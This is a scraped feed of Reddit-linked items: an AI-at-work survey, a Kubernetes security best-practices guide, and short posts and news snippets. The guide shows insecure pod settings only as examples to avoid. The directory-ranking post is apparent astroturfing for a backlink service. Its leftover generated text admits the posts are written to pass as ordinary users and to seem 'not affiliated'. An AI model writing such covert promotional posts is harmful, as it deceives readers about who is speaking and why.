Expert</h3><div><div><img loading=\"lazy\" src=\"https://cdn.buttercms.com/output=f:webp/OljRduSS3D6PybpQ4FQA\" alt=\"Dr Marie Haynes headshot\"></div><div><p>AI is bringing in workplace changes that feel unprecedented in terms of their speed. According to <a href=\"https://www.mariehaynes.com/\" rel=\"follow\">SEO and AI expert Dr Marie Haynes</a>, many specialist roles will soon be automated, but that might not be entirely bad news.</p><p>Haynes recalls a recent exchange with GPT-5 about Google's June Core update. \"It not only gave me a better answer than I would, but also offered to analyze my GSC data and interpret it for me,\" she says.</p><p><strong>In her view, we're entering a transition period where AI will take over routine expert work, but also unlock new possibilities.</strong> Without a development team, she could already build a tool to analyze Google updates. \"Eventually, even that won't be necessary,\" she adds, as personal AI assistants deliver the same insights directly to website owners.</p><p>While Haynes expects many jobs to vanish, she sees it as a familiar cycle. \"We no longer need lamp lighters, icemen or telephone operators,\" she says. \"Humanity will adapt, and the resilient will find incredible opportunities in this time of change.\"</p></div></div><h3>AI on the rise in the office</h3><p>Despite concerns, it is apparent that AI is rapidly growing in popularity in the workplace.</p><p>83.13% of people who use AI are now doing so at work. And they are employing it for a wide range of tasks.</p><p><strong>More than 6 in 10 people (64.78%) who use AI at work use it for writing reports, emails, and presentations.</strong></p><p>A similar number (63.48%) are using AI for editing. In other words, there’s a good chance that any written content you encounter in a business setting has had some kind of AI involvement.</p><p>Meanwhile, significant numbers of AI users are turning to the technology at work for data analysis (43.62%), creating images (34.63%), marketing summaries and note-taking (28.01%), and writing code (26%).</p><p><strong>Women (67.87%) are slightly more likely than men (61.98%) to use AI at work for writing. But men (52.09%) are far more likely than women (33.93%) to use AI for data analysis. </strong></p><h4><strong>The AI tools of choice at work</strong></h4><p>While there is marginally less consensus than in the home, ChatGPT is also the tool of choice at work.</p><p><strong>70.8% of workplace AI users are using ChatGPT.</strong></p><p>AI Mode and Gemini maintain second and third place, the same as for home usage, albeit with lower overall percentages.</p><p>But Meta falls down the rankings at work. Compared to home usage, it is overtaken by Copilot and Claude, and sits level with DeepSeek.</p><p>Claude Code and Cursor are both used more for work than home use.</p><h3>AI’s impact on the workplace</h3><p>The vast majority of people feel that AI has benefitted them at work.</p><p><strong>79.67% say that AI has at least “somewhat” improved their productivity. For over a third, that improvement has been “significant”.</strong></p><p>16.43% do not think AI has changed their productivity, but only a tiny minority think AI has actually had a negative impact in this regard. 2.25% of respondents say that their productivity has “somewhat” decreased, with 0.47% noting a “significant” drop.</p><p>Of course, productivity is not the only measure of success. But when asked to consider the overall picture, the majority of people still say that AI at work has been a positive experience.</p><p><strong>52.84% of people who use AI at work say it has been an entirely positive experience. A further 39.01% say it has “sometimes” been positive. </strong></p><p>This leaves a very small minority who are only reluctantly using AI at work. 4.49% of users believe the experience is “rarely” positive, and just 1.65% say that it is not at all positive.</p><p><strong>In a recurring theme, young people are the least likely to be unequivocally positive about their experiences of AI at work.</strong></p><p>Only 38.37% answered “yes” when asked if their experience with AI at work had been positive. That’s more than 14 percentage points lower than the overall average, and nearly 20 percentage points below the response from the 60+ age group.</p><p>Workplaces are generally matching their employees’ eagerness to embrace AI.</p><p><strong>42.67% of respondents say that their workplace actively encourages the use of AI. A further 41.37% allow the use of AI in some situations.</strong></p><p>Only 3.78% believe that their employers discourage or prohibit the use of AI, while 9.57% say that their workplace has no official stance.</p><p><strong>However, employer enthusiasm for AI is not always matched by proper training and support.</strong></p><p>Less than half of respondents (47.04%) feel they have received “excellent” training and support from leaders and management. Almost 1 in 5 (19.5%) believe they have not received any support.</p><p>A further 30.61% describe support and training as “limited”.</p><p>Employees in the Mid-Atlantic (60.66%) and Pacific (60.12%) are most likely to report excellent support. Workers in the Mountain (32.61%) and New England (32%) regions are most likely to report no support.</p><h3>The workplace AI mavericks</h3><p>With training inconsistent at best, perhaps it shouldn’t be surprising that plenty of employees are taking matters into their own hands.</p><p>Only a small number admit to outright rebelling against an overt anti-AI company stance. 3.78% say they are using AI despite their organization discouraging or prohibiting it.</p><p><strong>But with the majority of people not receiving excellent AI support at work, they are taking the initiative themselves. 28.84% exclusively pay for their own AI tools.</strong></p><p>A further 11.58% are using some tools they have paid for themselves, alongside tools funded by an employer. So all in all, more than 4 in 10 people are at least partially paying for their own workplace AI.</p><p>And almost exactly half (50.2%) of employees are using at least one personal AI account for work tasks.</p><p><strong>The tendency to “go rogue” and pay for one’s own AI tools increases with age.</strong></p><p>Among respondents aged 18-29, only 19.77% pay for their own AI tools at work. That rises to 33.9% for workers aged 60 and over.</p><p>But when it comes to free tools, younger workers are actually the most likely to use personal accounts rather than official company AI software.</p><p><strong>The picture is ultimately similar across all age groups: the control and oversight that employers exert over their employees’ AI usage is far from absolute. </strong></p><h3>At work and at home, the overall AI verdict is clear</h3><p>Technology might be moving a little too fast for employers to keep up. But for now, it seems as though nothing can stop the AI train.</p><p><strong>Overall attitudes are favorable. 91.4% at least sometimes enjoy using AI in everyday products and services.</strong></p><p>Likewise, almost 7 in 10 respondents (69.07%) describe their  attitude to AI as at least “somewhat” positive. Only 7.89% hold at least “somewhat” negative views.</p><p><strong>And when asked to predict the biggest impact of AI on their lives in the next 5 years, respondents overwhelmingly gave positive answers. </strong></p><p>Making work easier and more efficient was the most popular response.</p><p><strong>But AI providers and workplaces alike would be wrong to assume that the new technology is inherently appealing to the young.</strong></p><p>At home and at work, young people are consistently the most AI-skeptic, with their embrace of the technology the most qualified.</p><p>This generation will one day shape the future of AI adoption. As things stand, we expect to see them pump the brakes on a rise that so far has been stratospheric.</p><p>Exploding Topics’ research shows that AI is already boosting productivity for nearly 80% of people. The <a href=\"https://www.semrush.com/semrush-ai-toolkit/\">Semrush AI SEO Toolkit</a> gives you the same efficiency gains backed by reliable data, proven workflows, and tools built for real business impact.</p>","contentLength":15304,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mtxa2p/imagine_paying_for_the_tools_that_make_your_boss/"},{"title":"Optimising for trust","url":"https://www.reddit.com/r/programming/comments/1mtwxwk/optimising_for_trust/","date":1755547606,"author":"/u/SwoopsFromAbove","guid":231826,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/SwoopsFromAbove\"> /u/SwoopsFromAbove </a> <br/> <span><a href=\"https://tomrenner.com/posts/optimising-for-trust/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1mtwxwk/optimising_for_trust/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Kubernetes Security: Best Practices to Protect Your Cluster","url":"https://protsenko.dev/kubernetes-security-top-12-best-practices-to-protect-your-cluster/","date":1755544335,"author":"/u/NordCoderd","guid":231744,"unread":true,"content":"<p>Hi! In this article, I’m sharing 12 collected Kubernetes security best practices for making your cluster secure by writing secure deployments/services, etc. This article is based on my experience creating the <a href=\"https://plugins.jetbrains.com/plugin/25413-cloud-iac-security\" target=\"_blank\" rel=\"noreferrer noopener\">Kubernetes Security IDEA plugin</a> and all of the practices covered by the plugin.</p><h2>12 Kubernetes Hardening Best Practices</h2><h3>1. Using Non-Root Containers</h3><p>Always try to <strong>run containers as a non-root user</strong>. By default, containers execute as the  user (UID 0) inside the container, unless the image or Kubernetes securityContext specifies otherwise. Running as root inside a container might seem harmless (it’s isolated, right?), but it’s risky. If an attacker breaks out of the container, they will have root on the host. Even without a full breakout, a process running as root with certain misconfigurations (like some of the above capabilities or host mounts) could do more damage to the host. There’s a lack of certain preventive security controls when running as root, which <strong>increases the risk of container escape</strong>.</p><p>The better practice is to run as an unprivileged user. You can create a user in your container image (many official images have a user like , , etc., or you can create your own). Then either set that as the default in the Dockerfile or use Kubernetes to request it. Kubernetes securityContext has fields  and  which helps enforce this. For example:</p><pre><code>securityContext:\n  runAsUser: 1000      # UID 1000 (non-root user)\n  runAsNonRoot: true   # Ensure the container will not start as root</code></pre><p>By specifying , the kubelet will actually refuse to start the container if it would run as UID 0. This is a guardrail in case someone tries to deploy an image that runs as root – it won’t run unless you explicitly allow root. In many cases, just setting a specific user ID (and having the image prepared for that) is enough.</p><p>If you have an image that  run as root (some older software might assume it, or it needs privileged access), think carefully – can you modify the image or use a different solution? Running as root should be the exception, not the norm. Kubernetes’s restricted security profile mandates that containers run as non-root and even disallows setting  explicitly.</p><p> Many base images provide a non-root user, but don’t activate it by default. For example, the official Node.js image has a user “node” (UID 1000). You can use that in Kubernetes by doing runAsUser: 1000. For images that lack a user, consider rebuilding the image to add one or switching to an image that supports non-root operation.</p><p>Running as non-root adds an extra layer to Kubernetes security. Even if an attacker gets code execution in the container, they hit a lower-privileged user boundary, and it’s harder to escalate from there. Combine this with not running privileged and dropping caps, and your container is much less attractive to attackers.</p><h3>2. Using Privileged Containers</h3><p><strong>Don’t run containers in privileged mode</strong> unless absolutely necessary (and practically, it’s almost never necessary for typical apps). A privileged container (<code>securityContext.privileged: true</code>) has <strong>nearly all the same access to the host as processes on the host do</strong>. It lifts most of the restrictions that containers normally have. When you run a container privileged, it can access devices on the host, and it can become almost indistinguishable from a host process. It will share the host’s namespaces (IPC, PID, etc.), and many of the other controls (seccomp, AppArmor, capabilities limits) are not applied. In essence, a privileged container is “just a process on the host with root privileges,” which negates the security benefits of using containers.</p><p>Privileged mode might be used for low-level system tasks (for example, a container that needs to manipulate network interfaces or administer the host). But even in those cases, modern Kubernetes has alternatives (like using specific capabilities, or running as a daemon on the host outside of Kubernetes). Granting full privilege is like handing the keys to your kingdom to that container. If compromised, the attacker will trivially root the node and possibly move laterally in the cluster.</p><p>Kubernetes’s baseline policy <strong>forbids privileged containers for general workloads</strong>. Tools like admission controllers or Pod Security Policies (in the past) would prevent you from deploying privileged pods in most namespaces, and for good reason.</p><pre><code>securityContext:\n  privileged: true</code></pre><p>If you see that in a manifest, think twice. Why does it need to be privileged? Can we instead just give it the specific capability it needs? Or run it differently? In almost all cases, privileged containers are used for cluster infrastructure components, not for user applications. If you’re just running a web server, it should never be privileged. However, running something with elevated privileges is a bad idea, not only for Kubernetes security</p><p>If you absolutely must run something privileged (say, a CSI driver or a networking plugin that must manipulate the host network stack), ensure it’s isolated to its own namespace and no untrusted users can deploy containers there. Monitor that container closely. But for application workloads: . By avoiding privileged mode, you retain the isolation mechanisms (like cgroups, seccomp, AppArmor, namespaces, capabilities restrictions) that make containers a secure way to deploy applications. Privileged mode throws all that away and should be treated as a last-resort tool.</p><h3>3. Do not use hostPath Volumes</h3><p>Avoid hostPath volumes in your Pods whenever possible. A  volume mounts a file or directory from the host node’s filesystem directly into a pod. This is essentially giving the container direct access to part of the host’s file system. The security implications are significant: if the container is compromised, an attacker could read or modify critical files on the host through the hostPath mount. Even if the container isn’t running as root, hostPath can be combined with other escalations (like running privileged or a sticky bit attack) to tamper with the node.</p><p>HostPath volumes <strong>“present security risks that could lead to container escape.”</strong> They break the isolation between your application and the host OS. For example, consider if you mount  from the host (a common but extremely risky practice) – the container can then control the Docker daemon and effectively gain root on the host. Even mounting something innocuous, like  could allow a malicious container to poison logs or consume disk space. Writing to any hostPath with system files could potentially crash the node or alter its state.</p><p>Kubernetes acknowledges this risk: PodSecurity  forbids hostPath volumes entirely. If you  use a hostPath (for example, some daemon needs to read a host file), consider making it read-only and limiting the path as much as possible. Also, run that pod with the least privileges (non-root user, no extra caps, not privileged).</p><pre><code>volumes:\n- name: host-files\n  hostPath:\n    path: /etc\n    type: Directory</code></pre><p>The above would give the container access to the host’s  directory – clearly a bad idea, as it could read passwords or modify config. If your workload needs to read host info, see if there’s an API or Kubernetes mechanism (like Downward API for some metadata) instead.</p><p>There are a few legitimate use cases for hostPath (like a log collection agent reading  or a storage plugin writing to a host directory), but those should be deployed with tight controls and usually in dedicated namespaces. For most apps, you shouldn’t need hostPath at all. Use ConfigMap/Secret for config, EmptyDir for scratch space, and PVC for persistent storage. By avoiding hostPath, you keep the container fully sandboxed from the host’s filesystem, making Kubernetes security better.</p><h3>4. Do not use hostPort as Opens the Node’s Port</h3><p>Be cautious with the  setting on Pods. When you specify a  for a container, that port on the Kubernetes node (host machine) is opened and mapped to your pod. This can be risky because it exposes the host’s network interface to the container. If an attacker compromises the container, they could potentially intercept traffic on that host port or exploit it to gain deeper access. Exposing a host port to a container can <strong>open network pathways into your cluster</strong>, allowing the container to intercept traffic to a host service or bypass network policies. It also constrains scheduling (each host port can be used by only one Pod per node) and can lead to port conflicts.</p><p>In general, you should <strong>avoid using hostPort unless absolutely necessary</strong>. Most use cases (exposing a service externally) are better served by Kubernetes Services (NodePort or LoadBalancer types) or Ingress resources, which handle traffic routing more securely without binding directly to the host’s network ports. Reserve  for low-level system pods or networking tools that require a specific port on every node, and even then, use it sparingly.</p><pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostport-pod\nspec:\n  containers:\n  - name: nginx\n    image: nginx:latest\n    ports:\n    - containerPort: 80\n      hostPort: 80</code></pre><h3>5. Do not share the Host Namespace</h3><p>Pods can request to share certain namespaces with the host (node) – namely, the <strong>network, PID (process), and IPC namespaces</strong>. When a container shares the host’s namespace, it essentially breaks the isolation between the container and the host for that aspect. <strong>This is dangerous and should be avoided for most workloads.</strong> For example:</p><ul><li>If a pod sets , it means the pod is using the host machine’s network interface directly. The pod can see all host network interfaces and even potentially sniff traffic. This breaks the default network isolation between pods and the host.</li><li>If , the container shares the host’s process ID space. That means it can see (and potentially interact with) processes running on the host (or other pods on the host). An attacker might leverage this to tamper with host processes or simply gather sensitive info.</li><li>If , the pod shares the host’s inter-process communication namespace (things like shared memory segments). That could allow a malicious container to read/write shared memory used by something on the host.</li></ul><p>In short,  can lead to a container escape, compromising Kubernetes security. Pods that share namespaces with the host can communicate with host processes and glean information about the host, which is why it’s disallowed in baseline security policies.</p><p>Unless you are running a system-level daemon that  this (e.g., a monitoring agent that needs to see all host processes, or a network plugin that needs host networking), you should leave these fields false (which is the default).</p><pre><code>spec:\n  hostNetwork: true\n  hostPID: true\n  hostIPC: true</code></pre><p>Each of those should normally be false or not set at all. If you need one of them for a specific reason (say,  for a networking pod), isolate that to a dedicated namespace or node and tightly control it. And never run general application pods with any of those enabled.</p><p>Kubernetes Pod Security Standards (<a href=\"https://kubernetes.io/docs/concepts/security/pod-security-standards/#restricted\" target=\"_blank\" rel=\"noreferrer noopener nofollow\">Baseline</a> and <a href=\"https://kubernetes.io/docs/concepts/security/pod-security-standards/#restricted\" target=\"_blank\" rel=\"noreferrer noopener nofollow\">Restricted</a>) <strong>disallow sharing host namespaces</strong> for exactly these reasons. Adhere to that: <strong>pods should live in their own namespaces, not the host’s.</strong></p><h3>6. Do not use Insecure Capabilities</h3><p><strong>Drop unnecessary Linux capabilities from your containers.</strong> By default, containers run with a limited set of Linux capabilities – these are like fine-grained permissions that the root user inside the container can have. Granting additional or “non-default” capabilities can be dangerous. Certain powerful capabilities (for example,  or ) can allow a process in a container to perform actions that might lead to container escapes or privilege escalations on the node. As Google’s GKE security guidance notes: giving a container extra capabilities could allow it to break out of the container sandbox.</p><p>If you don’t explicitly drop capabilities, a container still has a small set of default capabilities. For better security, it’s best practice to <strong>drop all capabilities and only add back what you truly need</strong>. This adheres to the principle of least privilege. Kubernetes lets you specify this in the pod or container security context. For example:</p><pre><code>securityContext:\n  capabilities:\n    drop: [\"ALL\"]\n    add: [\"NET_BIND_SERVICE\"]</code></pre><p>In the above snippet, we drop everything and then only add  (which allows binding to ports below 1024) as an example of a minimally required capability. The Kubernetes  policy profile actually expects that containers drop ALL capabilities and, at most, add only a very limited set, like . Many common containers (especially web apps) do not require any special Linux capabilities to function.</p><pre><code>securityContext:\n  capabilities:\n    add: [\"NET_RAW\", \"SYS_ADMIN\"] </code></pre><p>Here,  allows the container to create raw sockets (which could be abused for packet spoofing or sniffing), and  is an extremely privileged capability that [among other things] allows mounting file systems, configuring network interfaces, etc. These could indeed be used to  and damage Kubernetes security. If your application truly needs a specific capability, add  and carefully audit the implications. In general, try to run with as few capabilities as possible.</p><h3>7. AppArmor Profile Disabled or Overridden</h3><p><strong>Avoid disabling or overriding AppArmor profiles for your containers.</strong> AppArmor is a Linux kernel security module that can confine what a container can do at the system level. On AppArmor-supported hosts, Kubernetes applies a default profile () to containers, which restrict certain actions. If you run a pod with an  AppArmor profile, you are effectively turning off these protections. In fact, running a container with an unconfined AppArmor profile is considered a . It means the container isn’t restricted by AppArmor at all, increasing the potential damage if that container is compromised.</p><p>By default, if you don’t specify an AppArmor profile, the container runtime’s default policy is used (which is typically a reasonably safe profile that provides essential Kubernetes Security protection). You should  explicitly set the profile to  (which disables AppArmor). Instead, allow the default or use a tailored profile if you have one. <a href=\"https://kubernetes.io/docs/concepts/security/pod-security-standards\" target=\"_blank\" rel=\"noreferrer noopener nofollow\">Kubernetes Pod Security</a> policies recommend using either the runtime default or specific allowed profiles, and preventing any override to an unconfined state.</p><pre><code>metadata:\n  name: insecure-pod\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/my-container: unconfined\nspec:\n  containers:\n  - name: my-container\n    image: alpine</code></pre><p>In the above snippet, the annotation forces the container’s AppArmor profile to , disabling AppArmor confinement. Instead, you should either omit the annotation (to use the default profile) or set it to  (to explicitly use the default). This ensures AppArmor is enforcing some restrictions on what the container can access on the host.</p><h3>8. Do not override Non-Default /proc Mount</h3><p>Ensure your containers use the <strong>default /proc mount behavior</strong>. In Linux,  it is a virtual filesystem that exposes process and kernel information. Container runtimes normally mask or hide certain paths  to prevent containers from seeing sensitive host information. Kubernetes has a setting  in the security context that can be either  (the normal, masked behavior) or .  for  unless you have a very good reason. An “unmasked” /proc means the container can see a lot more system info, which can lead to information leakage or even assist in a container escape.</p><p>Deployments with an <strong>unsafe /proc mount (procMount=Unmasked)</strong> bypass the default kernel protections. An unmasked  can potentially expose host information to the container, resulting in information leaks or providing an avenue for attackers to escalate privileges. For example, an Unmasked /proc might reveal details of processes running on the host or allow access to  (which could be dangerous). Unless you’re doing low-level debugging or monitoring that explicitly requires this (which is rare and usually better handled another way), you should not change the procMount from its default to maintain strong Kubernetes Security.</p><p>The best practice is simple: <strong>leave procMount as Default</strong>, which is also the Kubernetes default behavior if you don’t specify it. The <a href=\"https://kubernetes.io/docs/concepts/security/pod-security-standards/#restricted\" target=\"_blank\" rel=\"noreferrer noopener nofollow\">Pod Security Restricted standards</a> require that  the mask remain the default for all containers.</p><pre><code>securityContext:\n  procMount: Unmasked</code></pre><p>In summary, . Keep the default masks that Kubernetes and the container runtime provide—they reduce the container’s visibility into the host’s processes and kernel.</p><h3>9. Do not use Restricting Volume Types</h3><p>Not all types of volumes are equal when it comes to security. Kubernetes supports many volume types (ConfigMaps, Secrets, persistent volumes, hostPath, NFS, emptyDir, etc.), but some can expose your Pod to risk. The  defines an allow-list of safe volume types that a pod can use. Under the Restricted policy, only the following volume types are permitted: ConfigMap, CSI, DownwardAPI, emptyDir, Ephemeral (inline CSI volumes), PersistentVolumeClaim, Projected, and Secret. In practice, these are volumes that do  directly mount the host’s filesystem in an unsafe way.</p><p>The volume types  on that list (for example, , , , and some others) are either inherently risky or are better handled via PersistentVolumeClaims. For instance, a  volume mounts a directory from the node’s filesystem into your container – this can easily lead to container escapes or tampering with host files (we discuss hostPath in detail in the next section). NFS or other network storage volumes are less about privilege escalation and more about potential denial-of-service or data tampering across pods if not managed, but they are typically managed via the PersistentVolume subsystem rather than directly in a Pod spec.</p><p><strong>Use only the necessary volume types and prefer higher-level abstractions.</strong> If you need to mount storage, use PersistentVolumeClaim (with a proper StorageClass) instead of directly using a  or other host-dependent volume. This way, the cluster can enforce storage isolation, and you avoid giving the container direct access to the host. Most config data can be passed via ConfigMap or Secret volumes rather than being baked into images or using host paths.</p><p>If you have to enforce this, consider enabling the Kubernetes Pod Security Admission controller in  mode for your namespaces. It will automatically forbid Pods that use disallowed volume types. In short, <strong>limit volume types to the safe set</strong> – basically, ephemeral volumes (emptyDir, etc.), config/secret volumes, and PVCs backed by external storage. This reduces the risk of a container directly accessing the host or other unintended data sources, thereby strengthening Kubernetes Security.</p><h3>10. Do not set Custom SELinux Options</h3><p>Avoid specifying custom SELinux options for your pods unless you really know what you are doing.  is another Linux kernel security mechanism (a Mandatory Access Control system) that labels resources and defines which processes can access which resources. Kubernetes, by default, will let the container runtime apply a default SELinux context to your container (usually a confined type like ). You have the option to override the SELinux context via the pod or container securityContext ( field), but changing these labels can weaken isolation if done incorrectly.</p><p>The Snyk security blog warns: altering the SELinux labels of a container process could potentially allow that process to <strong>escape its container and access the host filesystem</strong>. In simpler terms, the default SELinux policy on a host is usually set up to prevent containers from seeing or modifying host files. If you override the SELinux type or role to something more privileged (or turn SELinux to permissive mode on the host), a compromised container might break out and read/write host files it shouldn’t.</p><p><a href=\"https://kubernetes.io/docs/concepts/security/pod-security-standards\" target=\"_blank\" rel=\"noreferrer noopener nofollow\">Kubernetes’ Pod Security Standards</a> reflect this by restricting SELinux options. The Restricted profile forbids setting a custom SELinux user or role, and only allows specific SELinux types (the standard container types like  or ). Unless you have a specific need (for example, integrating with a host that uses SELinux extensively and has custom policies), you typically won’t set these at all. Just let the container runtime apply the default confinement.</p><pre><code>securityContext:\n  seLinuxOptions:\n    user: system_u\n    role: system_r\n    type: spc_t      # “spc_t” is a special type for super-privileged containers</code></pre><p>The above would label the container in a very permissive way (depending on host policy,  might allow broad access). This is  unless absolutely required by your security team’s policy. In most cases, you should <strong>omit seLinuxOptions entirely</strong>. If you do need it, stick to the container types provided by your distribution (for example, on Red Hat-based systems,  is the confined type for containers).</p><p>In summary, do not override SELinux labels to something less restrictive. The defaults are there to keep your container constrained and maintain Kubernetes Security. Manage SELinux at the cluster/node level rather than per Pod unless you’re an SELinux expert with a clear goal. And if SELinux is too much overhead, consider using AppArmor or seccomp for adding security – but never making the container  privileged than defaults.</p><h3>11. Left Seccomp Profile by default</h3><p>Enable a seccomp profile for your containers (or use the default one); do not run containers with seccomp turned off (“unconfined”).  (secure computing mode) is a Linux kernel feature that can filter system calls that a process is allowed to make. Kubernetes lets you specify a seccomp profile for pods/containers. If you don’t specify anything, historically many runtimes would run the container as unconfined (no filtering), but newer Kubernetes versions and runtimes often apply a default seccomp profile (e.g., Docker’s default seccomp profile) automatically. Regardless, you want seccomp filtering in place.</p><p>Running a container with  means it can call any syscalls it wants, which broadens the attack surface. Unconfined places no restrictions on syscalls – allowing all system calls, which . In contrast, the default seccomp profile blocks dozens of dangerous syscalls that containers typically never need (like manipulating kernel modules, system clocks, etc.). These blocked calls are often those that could be used to break out or do harm to the host.</p><p>Best practice: use  seccomp profile (Kubernetes’ way of saying “use the container runtime’s default seccomp policy”) or a specific custom profile if you have one. The Kubernetes Restricted policy requires that seccomp be explicitly set to either RuntimeDefault or a named profile, and not left as Unconfined to maintain strong Kubernetes Security</p><p>This ensures the container is running under seccomp confinement. If you wanted to use a custom profile, you’d set  and provide the profile file, but that’s an advanced scenario. The main thing is – <strong>don’t set seccompProfile type to Unconfined</strong>. For example:</p><pre><code>securityContext:\n  seccompProfile:\n    type: Unconfined</code></pre><p>The above would explicitly disable syscall filtering, exposing you to exploits that leverage obscure syscalls. There have been real-world container breakouts that depended on having seccomp off, so turning it on is a simple way to mitigate whole classes of kernel vulnerabilities.</p><p>Unless you have a specific container that is failing due to seccomp (in which case, consider adjusting the profile rather than removing it entirely), you should always use seccomp. It’s a transparent layer of defense with little to no performance cost in typical applications.</p><h3>12. Beware of using Insecure Sysctls</h3><p><strong>Do not enable unsafe sysctls in your Pods.</strong> Sysctls (system controls) are kernel parameters that can tweak networking, memory, and other settings. Kubernetes classifies sysctls into  and . Safe sysctls are those that are namespaced to the container or pod (meaning their effects are limited to that pod) and isolated from the host. Unsafe sysctls are those that <strong>apply to the entire host kernel and could affect all pods</strong> or even compromise security. Examples of unsafe sysctls might include things like  (which affects kernel shared memory limits globally) or  (which could change node-level networking behavior).</p><p>Enabling unsafe sysctls can <strong>disable important security mechanisms or negatively impact the node’s stability</strong>. They might allow a pod to consume resources beyond its limits or interfere with other pods. In the worst case, a bad actor could use an unsafe sysctl to panic the kernel or elevate privileges.</p><p>Kubernetes  will prevent pods from using unsafe sysctls unless the cluster admin has explicitly allowed it (there’s a feature gate and a whitelist one can set on the kubelet). The best practice is to stick to the safe sysctls. According to the Pod Security Standards, you should disallow all but an allowed safe subset of sysctls. Safe sysctls include a handful of names like <code>net.ipv4.ip_local_port_range</code>, , <code>net.ipv4.ping_group_range</code>, etc., which are known not to break isolation.</p><p>If you find yourself needing to set a kernel parameter for your application to run, double-check if it’s truly namespaced. For example, increasing  for a database – rather use a proper mechanism or ensure it’s allowed, because that setting affects the host kernel’s shared memory allowance for all processes.</p><p> The following Pod securityContext shows setting a sysctl:</p><pre><code>securityContext:\n  sysctls:\n  - name: kernel.shmmax\n    value: \"16777216\"</code></pre><p>This particular sysctl () is not namespaced per pod – it would raise the shared memory segment size limit on the host kernel itself. This could impact other pods or processes on the host. Such a sysctl is considered unsafe and would be rejected by Kubernetes unless the cluster is configured to allow it (and it generally shouldn’t be). In contrast, a “safe” sysctl like  could be set in a pod’s spec if needed, because it’s isolated to the pod’s network namespace.</p><p>In summary, <strong>avoid using sysctls that are not explicitly documented as safe for Kubernetes</strong>. If you absolutely require an unsafe sysctl for a specialized application, you’ll need a waiver in the cluster, and you should isolate that workload as much as possible. For everyone else – stick to defaults; don’t turn your pods into mini kernel tweakers. The default kernel settings are usually fine, and if not, they should be tuned on the host by admins, not on a per-pod basis by application owners.</p><h2>Your Kubernetes Security Action Plan</h2><p>By adhering to these 12 Kubernetes security best practices, you significantly harden your Kubernetes cluster’s security. Many of these boil down to  – giving your pods only the access they truly need and nothing more.</p><p>Don’t miss my new articles—follow me on <a href=\"https://www.linkedin.com/in/protsenkodev/\" target=\"_blank\" rel=\"noreferrer noopener nofollow\">LinkedIn</a>!</p>","contentLength":26717,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1mtvgtb/kubernetes_security_best_practices_to_protect/"},{"title":"Used small-scale Al to rank \"good\" vs \"garbage\" directories (surprising results)","url":"https://www.reddit.com/r/artificial/comments/1mtvgm2/used_smallscale_al_to_rank_good_vs_garbage/","date":1755544323,"author":"/u/PrizeLight1","guid":231795,"unread":true,"content":"<p>I got curious if I could pre-score directories before submitting. I hacked a dumb pipeline: Fetch domain metrics (DA/DR-ish), outbound link ratio, indexation status</p><p>Simple model to classify “likely worthwhile” vs “meh” (trained on past referrer data)</p><p>Manually review top picks, then batch submit (human in the loop ftw)</p><p>Takeaway: a few niche directories with modest authority sent way more real clicks than big generic ones. Also, startup launch platforms (PH alternatives) drove a short burst that helped pages get crawled faster, which I didn’t expect. I tested a done-for-you pass too (for coverage + proof screenshots) and then fed their report back into my model: <a href=\"http://getmorebacklinks.org\">getmorebacklinks.org</a></p><p>Curious if anyone else is ranking directories with ML features beyond the usual authority metrics? Awesome here are 10 more posts, each written like a regular user sharing what worked (not affiliated), with 1–2 extra links sprinkled in so it feels real. i varied tone + angles, hit niche tricks, and kept things human (a few light imperfections on purpose). i also didn’t push the same link every time.</p>","contentLength":1102,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"AI transformation looks different from the top, but the same patterns keep showing up","url":"https://www.reddit.com/r/artificial/comments/1mtrrkx/ai_transformation_looks_different_from_the_top/","date":1755536385,"author":"/u/Snarkitech","guid":233387,"unread":true,"content":"<p>I have led enough transformations to recognize a pattern. Every few years the buzzword changes. It was ERP. Then it was Lean. Then it was digital. Today it is AI. The packaging is new but the script is the same.</p><p>The boardroom loves the headlines. Leaders talk about revolution. Consultants roll out shiny decks. On the ground, nothing changes. People still resist. Culture still blocks adoption. Execution still falters in the middle layers.</p><p>The difference this time is that the technology is actually powerful. AI can strip weeks out of processes and expose insights we never had before. But none of that matters if the company runs the same way it always has.</p><p>That is the part no one likes to admit. Transformation fails not because the tech is weak, but because the system using it is broken.</p><p>Has anyone here actually seen AI break that cycle? Or is it just another costume change in the same corporate </p>","contentLength":902,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Location of EACL 2026","url":"https://www.reddit.com/r/MachineLearning/comments/1mtq2qy/d_location_of_eacl_2026/","date":1755532739,"author":"/u/ThRiLLeXx","guid":233197,"unread":true,"content":"<p>I've been looking for some information on EACL 2026 as I'd like to submit something to the October cycle. However, the only thing I found so far was the <a href=\"https://www.aclweb.org/portal/content/eaclacl-2026-joint-call-workshops\">joint call for workshops</a> of EACL/ACL 2026.</p><p>But, according to this webpage, EACL 2026 would happen outside of Europe (Rabat, Morocco, from March 24-29, 2026).</p><p>Do you think this information is accurate, or am I simply missing something?</p>","contentLength":385,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"This CEO laid off nearly 80% of his staff because they refused to adopt AI fast enough. 2 years later, he says he'd do it again","url":"https://fortune.com/2025/08/17/ceo-laid-off-80-percent-workforce-ai-sabotage/","date":1755532163,"author":"/u/fortune","guid":231689,"unread":true,"content":"<p>Over the course of 2023 and into the first quarter of 2024, Vaughan said IgniteTech replaced hundreds of employees, declining to disclose a specific number. “That was not our goal,” he told . “It was extremely difficult…But changing minds was harder than adding skills.” It was, by any measure, a brutal reckoning—but Vaughan insists it was necessary, and says he’d do it again.\n\n\n\n</p><p>For Vaughan, the writing on the wall was clear and dramatic. “In early 2023, we saw the light,” he told  in an interview, adding that he believed every tech company was facing a crucial inflection point around adoption of artificial intelligence. “Now I’ve certainly morphed to believe that this is every company, and I mean that literally every company, is facing an existential threat by this transformation.” \n\n\n\n</p><p>Where others saw promise, Vaughan saw urgency—believing that failing to get ahead on AI could doom even the most robust business. He called an all-hands meetingwith his global remote team. Gone were the comfortable routines and quarterly goals. 